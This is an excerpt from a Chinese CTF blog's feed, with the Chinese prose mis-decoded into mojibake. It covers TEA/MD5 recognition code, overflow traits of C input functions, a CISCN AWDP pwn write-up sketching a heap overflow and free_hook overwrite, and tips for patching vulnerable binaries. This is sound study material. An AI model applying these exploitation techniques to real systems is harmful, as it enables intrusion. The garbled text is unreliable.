l) ^ (<span class="built_in">sum</span> + key[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        <span class="built_in">sum</span> -= DELTA</span><br><span class="line">        l -= (((r &lt;&lt; <span class="number">4</span>) ^ (r &gt;&gt; <span class="number">5</span>)) + r) ^ (<span class="built_in">sum</span> + key[<span class="built_in">sum</span> &amp; <span class="number">3</span>])</span><br><span class="line">    <span class="keyword">return</span> [l, r]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¤ºä¾‹æ•°æ®</span></span><br><span class="line">key1 = [<span class="number">0xa3eeb7be</span>, <span class="number">0x50e7de9a</span>, <span class="number">0x6dbcc2bc</span>, <span class="number">0x78591fad</span>]</span><br><span class="line">key2 = [<span class="number">0x78591fad</span>, <span class="number">0x6dbcc2bc</span>, <span class="number">0xa3eeb7be</span>, <span class="number">0x50e7de9a</span>]</span><br><span class="line">v1 = [<span class="number">0x556E2853</span>, <span class="number">0x4393DF16</span>]</span><br><span class="line">v2 = [<span class="number">0x1989FB2B</span>, <span class="number">0x83F5A243</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ å¯†</span></span><br><span class="line">encrypted_v1 = tea_encrypt(v1, key1)</span><br><span class="line">encrypted_v2 = tea_encrypt(v2, key2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encrypted v1: <span class="subst">&#123;encrypted_v1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encrypted v2: <span class="subst">&#123;encrypted_v2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†</span></span><br><span class="line">decrypted_v1 = tea_decrypt(encrypted_v1, key1)</span><br><span class="line">decrypted_v2 = tea_decrypt(encrypted_v2, key2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted v1: <span class="subst">&#123;decrypted_v1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted v2: <span class="subst">&#123;decrypted_v2&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h1>XTea/XXTea</h1><h1>MD5</h1><h2 id="è¯†åˆ«-5">è¯†åˆ«</h2><p>128ä½æ•£åˆ—å€¼ï¼Œéœ€è¦ä¸€ä¸ªcontextç»“æ„ä½“ï¼Œåˆ†ä¸‰æ­¥ï¼Œinitï¼Œupdatestringå’Œfinal</p><p>å…¶ä¸­initè¿‡ç¨‹ä¼šå°†contextåˆå§‹åŒ–ä¸º4ä¸ªå›ºå®šçš„magic_number:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MD5Init</span> <span class="params">(MD5_CTX *context)</span></span><br><span class="line"><span class="comment">/*context*/</span></span><br><span class="line">&#123;</span><br><span class="line">    context-&gt;count[<span class="number">0</span>] = context-&gt;count[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* Load magic initialization constants. */</span></span><br><span class="line">    context-&gt;state[<span class="number">0</span>] = <span class="number">0x67452301</span>;</span><br><span class="line">    context-&gt;state[<span class="number">1</span>] = <span class="number">0xefcdab89</span>;</span><br><span class="line">    context-&gt;state[<span class="number">2</span>] = <span class="number">0x98badcfe</span>;</span><br><span class="line">    context-&gt;state[<span class="number">3</span>] = <span class="number">0x10325476</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IO-6">IO</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¦è®¡ç®—å“ˆå¸Œå€¼çš„å­—ç¬¦ä¸²</span></span><br><span class="line">data = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ª MD5 å“ˆå¸Œå¯¹è±¡</span></span><br><span class="line">md5_hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ–°å“ˆå¸Œå¯¹è±¡</span></span><br><span class="line">md5_hash.update(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–åå…­è¿›åˆ¶çš„å“ˆå¸Œå€¼</span></span><br><span class="line">hash_value = md5_hash.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;MD5 Hash: <span class="subst">&#123;hash_value&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;å‚è€ƒè‡ª &lt;a href=&quot;https://www.cnblogs.com/Moomin/p/15004170.html#aes&quot;&gt;https://www.cnblogs.com/Moomin/p/15004170.html#aes&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="é€†å‘" scheme="https://zjw1nd.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="basic" scheme="https://zjw1nd.github.io/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>ç®€çŸ­çš„IOå‡½æ•°ç‰¹æ€§æ•´ç†â€”â€”å—scanfå¯å‘</title>
    <link href="https://zjw1nd.github.io/2025/03/11/%E7%AE%80%E7%9F%AD%E7%9A%84%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7%E6%95%B4%E7%90%86%E2%80%94%E2%80%94%E5%8F%97scanf%E5%90%AF%E5%8F%91/"/>
    <id>https://zjw1nd.github.io/2025/03/11/%E7%AE%80%E7%9F%AD%E7%9A%84%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7%E6%95%B4%E7%90%86%E2%80%94%E2%80%94%E5%8F%97scanf%E5%90%AF%E5%8F%91/</id>
    <published>2025-03-11T12:50:37.000Z</published>
    <updated>2025-03-17T14:28:27.890Z</updated>
    
    <content type="html"><![CDATA[<p>æ¥æºäºäº’è”ç½‘è€Œéè‡ªå·±æ‰‹åŠ¨è°ƒè¯•ï¼Œä¾›å‚è€ƒï¼Œæ˜¯å¦çœŸå®ä¸€è¯•ä¾¿çŸ¥ï¼Œä»…ä¾›å¤‡å¿˜ã€‚</p><h1>è¾“å…¥</h1><h1>gets(buf)</h1><ul class="lvl-0"><li class="lvl-2">æ˜¯å¦èƒ½æº¢å‡ºï¼šä¸æ£€æŸ¥é•¿åº¦ï¼Œä»»æ„æº¢å‡º</li><li class="lvl-2">æˆªæ–­è¦æ±‚ï¼šæ¢è¡Œæˆªæ–­(\n,\x0a)å’ŒEOFæˆªæ–­ã€‚æ¢è¡Œç¬¦ä¼šè¢«ä¸¢å¼ƒã€‚å…¶ä»–ç©ºç™½å­—ç¬¦å‡ä¼šåŸæœ¬è¾“å…¥ã€‚</li><li class="lvl-2">å…¶ä»–å¤„ç†ï¼šç»“å°¾è‡ªåŠ¨æ·»åŠ \x00</li></ul><h1>read(0,buf,cnt)</h1><p>ä½œä¸ºä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå’Œå…¶ä»–çš„è¾“å…¥å‡½æ•°ç¡®å®æœ‰æœ¬è´¨åŒºåˆ«ã€‚</p><ul class="lvl-0"><li class="lvl-2"><p>æ˜¯å¦èƒ½æº¢å‡ºï¼šå‚æ•°3æœ‰é•¿åº¦é™åˆ¶ï¼Œä¸åˆç†æ—¶å¯èƒ½å¯¼è‡´æº¢å‡ºã€‚</p></li><li class="lvl-2"><p>æˆªæ–­è¦æ±‚ï¼šæ²¡æœ‰æˆªæ–­å­—ç¬¦ï¼Œè¯»å¤Ÿç¼“å†²åŒºæ•°æ®æˆ–cntå­—èŠ‚åç«‹åˆ»è¿”å›ã€‚å…¶ä¸­ç»ˆç«¯é»˜è®¤è§„èŒƒä¸‹å›è½¦ä¼šå¯¼è‡´æäº¤ï¼Œç»“æœä¸­ä¼šåŒ…å«æœ‰\nå­˜åœ¨ã€‚é»˜è®¤æƒ…å†µä¸‹readåœ¨æ²¡æœ‰å¯ç”¨æ•°æ®æ—¶ä¼šé˜»å¡ã€‚</p></li></ul><p>å¯ä»¥è¯´æ˜¯æœ€é€šç”¨çš„ï¼Œç›´æ¥åœ¨pwntoolsä¸­è°ƒç”¨sendå°±å¯ä»¥æ— æŸå‘é€æ•°æ®ã€‚</p><h1>scanf</h1><p><a href="https://blog.csdn.net/qq_54218833/article/details/121308367">å‚è€ƒæ–‡ç« </a><br>scanfçš„è¾“å…¥æ–¹å¼å–å†³äºå…¶æ ¼å¼åŒ–å ä½ç¬¦ã€‚æˆ‘ä»¬ä¸‹é¢é‡ç‚¹å…³æ³¨å­˜åœ¨æº¢å‡ºçš„%s</p><ul class="lvl-0"><li class="lvl-2"><p>æ˜¯å¦èƒ½æº¢å‡ºï¼šå–å†³äºæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚å…¶ä¸­â€™%sâ€™å¹¶ä¸æ£€æŸ¥è¾“å…¥é•¿åº¦ï¼Œæ•°å­—</p></li><li class="lvl-2"><p>æˆªæ–­è¦æ±‚ï¼šæ³¨æ„ï¼Œscanfç”±ç©ºæ ¼åŒºåˆ†ä¸åŒçš„æ ¼å¼åŒ–å‚æ•°ï¼Œ**å³scanf(â€˜%sâ€™)æ˜¯ç©ºæ ¼(\x20)æˆªæ–­çš„ã€‚**å¦å¤–åç›´è§‰çš„æ˜¯ï¼Œscanf(â€˜%sâ€™)æ²¡æœ‰0æˆªæ–­ã€‚</p></li></ul><h1>puts</h1><ul class="lvl-0"><li class="lvl-2"><p>æœ«å°¾è‡ªåŠ¨é¢å¤–æ·»åŠ æ¢è¡Œâ€™\nâ€™</p></li><li class="lvl-2"><p>0æˆªæ–­</p></li></ul><h1>printf</h1><p>å’Œscanfç±»ä¼¼ï¼Œè¾“å‡ºæ–¹å¼å–å†³äºæ ¼å¼åŒ–å­—ç¬¦ä¸²fmtå‚æ•°çš„è®¾ç½®ã€‚æˆ‘ä»¬è¿™é‡Œä¸è°ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´</p><ul class="lvl-0"><li class="lvl-2"><p>%så°±æ˜¯è¾“å‡ºå­—ç¬¦ä¸²</p></li></ul><h1>write</h1><p>å†™å…¥æ–‡ä»¶æè¿°ç¬¦ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨write(1,buf,cnt)</p><ul class="lvl-0"><li class="lvl-2"><p>æ²¡æœ‰ä»»ä½•æˆªæ–­æˆ–æ¢è¡Œï¼Œå•çº¯æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºæµã€‚</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ¥æºäºäº’è”ç½‘è€Œéè‡ªå·±æ‰‹åŠ¨è°ƒè¯•ï¼Œä¾›å‚è€ƒï¼Œæ˜¯å¦çœŸå®ä¸€è¯•ä¾¿çŸ¥ï¼Œä»…ä¾›å¤‡å¿˜ã€‚&lt;/p&gt;
&lt;h1&gt;è¾“å…¥&lt;/h1&gt;
&lt;h1&gt;gets(buf)&lt;/h1&gt;
&lt;ul class=&quot;lvl-0&quot;&gt;
&lt;li class=&quot;lvl-2&quot;&gt;æ˜¯å¦èƒ½æº¢å‡ºï¼šä¸æ£€æŸ¥é•¿åº¦ï¼Œä»»æ„æº¢å‡º&lt;/li&gt;
&lt;li class</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="basic" scheme="https://zjw1nd.github.io/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>2023ciscnå†³èµ›awdpå¤ç°æ€è·¯</title>
    <link href="https://zjw1nd.github.io/2025/03/10/2023ciscn%E5%86%B3%E8%B5%9Bawdp%E5%A4%8D%E7%8E%B0%E6%80%9D%E8%B7%AF/"/>
    <id>https://zjw1nd.github.io/2025/03/10/2023ciscn%E5%86%B3%E8%B5%9Bawdp%E5%A4%8D%E7%8E%B0%E6%80%9D%E8%B7%AF/</id>
    <published>2025-03-10T12:16:09.000Z</published>
    <updated>2025-07-22T08:39:24.232Z</updated>
    
    <content type="html"><![CDATA[<h1>CarManager</h1><p>éš¾ç‚¹åœ¨äºæ•°æ®ç»“æ„å¥—æ•°æ®ç»“æ„ï¼Œé¢‘ç¹çš„è¿›è¡Œæ··ä¹±çš„å†™å…¥å’Œé‡Šæ”¾ï¼Œæ£€æŸ¥æ˜¯å¦å‡ºç°UAFå’Œæº¢å‡ºæ¯”è¾ƒæµªè´¹æ—¶é—´ï¼Œèµ›åœºä¸Šä¼°è®¡å¾ˆå®¹æ˜“æ¼ã€‚åˆ†ä¸ºç”¨æˆ·-car-commentä¸‰å¥—ä¸œè¥¿çš„èœå•ï¼Œæ¯ä¸ªéƒ½èƒ½åˆ æ”¹æŸ¥å¹¶ä¸”ä»£ç é£æ ¼ä¸ç»Ÿä¸€ã€‚</p><p>æœ€æ˜¾çœ¼çš„æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯åˆ©ç”¨éœ€è¦è¿‡ä¸€ä¸ªchallengeï¼Œå¼€å§‹çœ‹ä¸æ‡‚ä»¥ä¸ºæ˜¯ä»€ä¹ˆç®€å•çš„å¯¹ç§°åŠ å¯†ï¼Œæœçš„é¢˜çš„wpä¹Ÿæ²¡æœ‰è¿™ä¸ªéƒ¨åˆ†ï¼Œç»“æœç»™aiè¯´æ˜¯ä¸ªæ•°ç‹¬ï¼Œç¬‘äº†ã€‚</p><p>ç¬¬äºŒæ˜¾çœ¼çš„æ˜¯mallocå‚æ•°å–å†³äºç”¨æˆ·è¾“å…¥</p><p>wpè¯´çš„UAFè§‰å¾—æ˜¯false positiveäº†ï¼Œå †æº¢å‡ºç¡®å®éšè”½ï¼Œæ˜¯ä¸€ä¸ªstrlenç¡®å®šsizeçš„æ—¶å€™å¯¼è‡´çš„ï¼Œå¦‚æœchunkå†™æ»¡äº†ä¼šè®©strlenå˜å¤§ï¼Ÿå¯ä»¥åšæº¢å‡º</p><h1>codelog</h1><p>åˆ°å¤„æ˜¯è¿™ç§è¾“å…¥è°èƒ½ä¿å‡†æ²¡é—®é¢˜å•Šï¼Œè€è€å®å®readä¸å¥½å—â€¦</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall <span class="title function_">sub_401536</span><span class="params">(_BYTE *a1, <span class="type">ssize_t</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = a2--;</span><br><span class="line">    LOBYTE(v2) = v2 != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 = read(<span class="number">0</span>, a1, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *__errno_location() != <span class="number">11</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(v2) = *__errno_location();</span><br><span class="line">        <span class="keyword">if</span> ( (_DWORD)v2 != <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">return</span> v2;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *a1 == <span class="number">10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LOBYTE(v2) = (_BYTE)a1;</span><br><span class="line">        *a1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">      &#125;</span><br><span class="line">      ++a1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡çš„shellï¼Œæ”¯æŒ9ä¸ªæ“ä½œè¿™ä¸ªç¨‹åºçš„sbåœ°æ–¹åœ¨äºä¼¼ä¹é€†å‘å­˜åœ¨é—®é¢˜ï¼Œå±€éƒ¨å‚æ•°åœ¨å‡½æ•°å†…éƒ¨ç›´æ¥ç”¨rbp+0x10å’Œrbp+0x18è®¿é—®ï¼Œè€Œ64ä½ä¸­é—´çš„é‚£äº›å¯„å­˜å™¨å‚æ•°å…¨éƒ¨å¼ƒç”¨äº†ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004029FF loc_4029FF:                             ; CODE XREF: main+C7â†‘j</span><br><span class="line">.text:00000000004029FF                                         ; DATA XREF: .rodata:jpt_4029FCâ†“o</span><br><span class="line">.text:00000000004029FF                 lea     rax, [rbp+var_70] ; jumptable 00000000004029FC case 0</span><br><span class="line">.text:0000000000402A03                 push    [rbp+var_28]</span><br><span class="line">.text:0000000000402A06                 push    [rbp+var_30]</span><br><span class="line">.text:0000000000402A09                 push    [rbp+var_38]</span><br><span class="line">.text:0000000000402A0C                 push    [rbp+var_40]</span><br><span class="line">.text:0000000000402A0F                 mov     rdi, rax</span><br><span class="line">.text:0000000000402A12                 call    sub_401C2E</span><br></pre></td></tr></table></figure><p>æœ‰ç—…æ˜¯å§</p><p>å·²å‡ºï¼Œé¢˜ç›®èŠ±é‡Œèƒ¡å“¨ï¼Œä½†æ˜¯äº‹å®ä¸Šmallocå’Œfreeçš„åœ°æ–¹å¾ˆå°‘ï¼Œè¿™å°±å¸¦æ¥äº†ä¸€ä¸ªå¥½å¤„ï¼Œå³æˆ‘ä»¬ç¡®å®šæº¢å‡ºç‚¹åï¼Œåªéœ€è¦è·Ÿè¸ªæ‰€æœ‰å¯èƒ½çš„åˆ†é…å’Œé‡Šæ”¾å°±è¡Œäº†ï¼Œå®Œå…¨ä¸è¦å»é€†å‘ç¨‹åºåˆ°åº•åœ¨å¹²å˜›ï¼ˆè¯´å®è¯æ•°æ®ç»“æ„æå…¶æ··ä¹±ï¼‰</p><p>å®šå¥½æº¢å‡ºç‚¹ä¹‹åå°±åœ¨è¿™é‡Œæ‰“æ–­ç‚¹ï¼Œç„¶åç”¨æ‰€æœ‰å…¶ä»–çš„ä¸œè¥¿å»ç»™è¿™ä¸ªæº¢å‡ºç‚¹åšå †é£æ°´ï¼Œæ‰“tcacheå†™freehookä¸€æŠŠæ¢­ã€‚å¦å¤–ï¼Œscanf(%s)å‡ºä¹æ„æ–™çš„èƒ½è¾“å…¥\x00ï¼Œåè€Œä¼šè¢«ç©ºæ ¼(\x20)æˆªæ–­ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;CarManager&lt;/h1&gt;
&lt;p&gt;éš¾ç‚¹åœ¨äºæ•°æ®ç»“æ„å¥—æ•°æ®ç»“æ„ï¼Œé¢‘ç¹çš„è¿›è¡Œæ··ä¹±çš„å†™å…¥å’Œé‡Šæ”¾ï¼Œæ£€æŸ¥æ˜¯å¦å‡ºç°UAFå’Œæº¢å‡ºæ¯”è¾ƒæµªè´¹æ—¶é—´ï¼Œèµ›åœºä¸Šä¼°è®¡å¾ˆå®¹æ˜“æ¼ã€‚åˆ†ä¸ºç”¨æˆ·-car-commentä¸‰å¥—ä¸œè¥¿çš„èœå•ï¼Œæ¯ä¸ªéƒ½èƒ½åˆ æ”¹æŸ¥å¹¶ä¸”ä»£ç é£æ ¼ä¸ç»Ÿä¸€ã€‚&lt;/p&gt;
&lt;p&gt;æœ€æ˜¾çœ¼çš„æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–å­—</summary>
      
    
    
    
    <category term="WP" scheme="https://zjw1nd.github.io/categories/WP/"/>
    
    
    <category term="awdp" scheme="https://zjw1nd.github.io/tags/awdp/"/>
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Awdp-PWNå‡†å¤‡æŠ€å·§</title>
    <link href="https://zjw1nd.github.io/2025/02/25/Awdp-PWN%E5%87%86%E5%A4%87%E6%8A%80%E5%B7%A7/"/>
    <id>https://zjw1nd.github.io/2025/02/25/Awdp-PWN%E5%87%86%E5%A4%87%E6%8A%80%E5%B7%A7/</id>
    <published>2025-02-25T11:40:53.000Z</published>
    <updated>2025-03-17T14:14:23.956Z</updated>
    
    <content type="html"><![CDATA[<h1>ç¯å¢ƒé—®é¢˜</h1><p>é¦–å…ˆï¼Œæˆ‘æœ‰ä¸¤å¥—ç¯å¢ƒã€‚ä¸€ä¸ªwindowsä¸€ä¸ªarchï¼Œéƒ½æ˜¯ç‰©ç†æœºã€‚</p><p>å…¶ä¸­ï¼Œwindowsä¸Šæ‹¥æœ‰kali-wslå’Œwin_penetration_toolkit-vmwareï¼Œå¹³å¸¸çš„pwné¢˜æ˜¯é‡‡ç”¨</p><ul class="lvl-0"><li class="lvl-2"><p>wsl-kaliæ‰§è¡Œpythonè„šæœ¬/gdbè°ƒè¯•ï¼Œpatchelf+glibc-all-in-oneï¼Œwindowsä¸»æœºidaåˆ†æ</p></li></ul><p>ç¼ºç‚¹æ˜¯ï¼Œwindowsä¸Šæ²¡æœ‰dockerã€‚åšä¸äº†å†…æ ¸é¢˜ã€‚ä¼˜ç‚¹æ˜¯ï¼Œwindowsä¸Šå…·æœ‰æ¸—é€æµ‹è¯•çš„è™šæ‹Ÿæœºï¼Œå¯ä»¥è¯´æ¸—é€åŸºæœ¬ä¸Šå¿…é¡»ç”¨winï¼ˆblackarchå¼€å‘ä¸æ˜¯å¾ˆå…¨ï¼‰</p><p>è€Œlinuxç¯å¢ƒä¸Šä¹Ÿæœ‰åŸç”Ÿidaæ”¯æŒï¼Œä¹Ÿèƒ½åšï¼Œç¼ºç‚¹åœ¨äºæ²¡æœ‰æ‚ä¸ƒæ‚å…«çš„å·¥å…·æ¯”å¦‚anytxtï¼Œlocalsendè¿™ç§ï¼Œä¹Ÿç¼ºmiscå·¥å…·ï¼Œä»¥åŠæ¸—é€çš„å·¥å…·ã€‚</p><p>linuxå‡†å¤‡å¥½ubuntuçš„ä¸‰ä¸ªdockerï¼Œéƒ½å®‰è£…gdbï¼Ÿ</p><h2 id="pwné¢˜é…ç½®">pwné¢˜é…ç½®</h2><p>å‚è€ƒè‡ª<a href="https://blog.csdn.net/qq_38154820/article/details/119259414">æ–‡ç« 1</a></p><p><a href="https://xz.aliyun.com/news/13321?time__1311=eqUxuDcDBGe7qRxBqDwjDAh%2BO3phwBbD&amp;u_atoken=9d921b0c0075e2df58d83b37a58c5b31&amp;u_asig=0a47315217404858836656288e003d">æ–‡ç« 2(åŒ…æ‹¬æµé‡è½¬å‘ï¼Œæ‰¹é‡æ”»å‡»è„šæœ¬)</a></p><h1>å‡†å¤‡</h1><p>æ‰‹åŠ¨patchï¼Œä½¿ç”¨ida keypatchå³å¯ã€‚æ‰“åŒ…å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf archive.tar file1 file2 directory</span><br><span class="line">tar -czvf archive.tar.gz directory</span><br><span class="line">tar -rvf archive.tar newfile</span><br><span class="line"></span><br><span class="line">tar -xvf archive.tar</span><br><span class="line">tar -zcvf update.tar.gz update.sh pwn_fix</span><br></pre></td></tr></table></figure><h1>å¸¸è§æ¼æ´çš„patchæ–¹æ³•</h1><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2><ol><li class="lvl-3"><p>printf=&gt;puts,ç›´æ¥æ”¹callçš„åœ°å€å³å¯ã€‚é£é™©æ˜¯putsä¼šåœ¨ç»“å°¾æ·»åŠ æ¢è¡Œï¼Œä¸ä¸€å®šèƒ½è¿‡æ£€æŸ¥ã€‚</p></li><li class="lvl-3"><p>å¼ºè¡Œè°ƒæ•´å‚æ•°ã€‚rdiæ”¾&quot;%s&quot;ï¼Œrsiæ”¾åŸå‚æ•°ã€‚ç¨‹åºé‡Œæœ‰%såœ¨çš„è¯ä¼šå¥½ä¸€ç‚¹ï¼Œå¦‚æœæ²¡æœ‰%sçš„è¯ï¼Œæˆ‘ä»¬å¯èƒ½è¦æ‰¾3å­—èŠ‚å¡è¿›å»å¦‚ä¸‹å†…å®¹ï¼š</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x25 0x73 0x00== %s\0</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æŒ‡ä»¤ä¹Ÿå¯èƒ½ä¸å¤Ÿé•¿ï¼Ÿ</p><h2 id="UAF">UAF</h2><blockquote><p>â€œUAFå°±ç›´æ¥æŠŠfree nopæ‰â€ â€”â€”æŸä½å¤§è·Œå­¦é•¿</p></blockquote><p>checkè¿‡ç¨‹ä¸­æ²¡åŠæ³•æ£€æŸ¥æ˜¯å¦æœ‰freeï¼Œæ‰€ä»¥ç›´æ¥nopæ‰freeä¼¼ä¹æ˜¯ä¸ªä¸é”™çš„æ–¹æ¡ˆã€‚åæ­£ä¹Ÿçˆ†ä¸äº†ï¼Œå†…å­˜å°±åœ¨é‚£æ‰”ç€ä½ ä¹Ÿä¸èƒ½æ€ä¹ˆæ ·</p><h2 id="æ•´æ•°æº¢å‡º">æ•´æ•°æº¢å‡º</h2><p>æ•´æ•°æº¢å‡ºæ¯”è¾ƒç®€å•ï¼Œä¿®æ”¹ç›¸åº”åˆ¤æ–­æŒ‡ä»¤çš„è·³è½¬é€»è¾‘å°±è¡Œï¼ˆï¼Ÿï¼‰å°†æœ‰ç¬¦å·è·³è½¬æ”¹ä¸ºæ— ç¬¦å·ï¼Ÿ</p><h2 id="ç¼“å†²åŒºæº¢å‡º">ç¼“å†²åŒºæº¢å‡º</h2><p>æ”¹å°ç›¸å…³çš„è¾“å…¥é•¿åº¦,åˆ†x86å’Œx64ï¼Œå†™æ­»çš„æ•°å€¼å‚æ•°x86éœ€è¦patch pushæŒ‡ä»¤ï¼Œä½†æ˜¯æ³¨æ„ï¼Œåœ¨æ“ä½œæ•°å¤§äº0x100çš„æ—¶å€™pushå†…å®¹å¯èƒ½ä¼šå˜åŒ–ï¼Œæ¶‰åŠåˆ°æ ˆå¹³è¡¡çš„é—®é¢˜éœ€è¦æ³¨æ„ã€‚<br>x64å°±ç›´æ¥patchå¯„å­˜å™¨èµ‹å€¼å³å¯ã€‚</p><p>scanfçš„è¯å°è¯•å°†&quot;%s&quot;æ”¹æˆ&quot;%ns&quot;æ¥é™åˆ¶è¾“å…¥é•¿åº¦ï¼Œå¦‚æœé•¿åº¦æ˜¯åŠ¨æ€çš„å°è¯•äº†ä¸‹æ”¹æˆread(0,buf,len)ä¸€èˆ¬æ±‡ç¼–ä¹Ÿæ˜¯å¤Ÿçš„</p><h2 id="VM">VM</h2><p>æ ¸å¿ƒæ˜¯é˜²æ­¢åœ¨vmæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ä¸­è¶Šç•Œ/éé¢„æœŸçš„è¯»å†™ï¼Œå…·ä½“é—®é¢˜å…·ä½“åˆ†æï¼Œè‚¯å®šä¼šæœ‰æ‰§è¡ŒæŒ‡ä»¤è¿‡ç¨‹ä¸­çš„checkæ¼æ´</p><h2 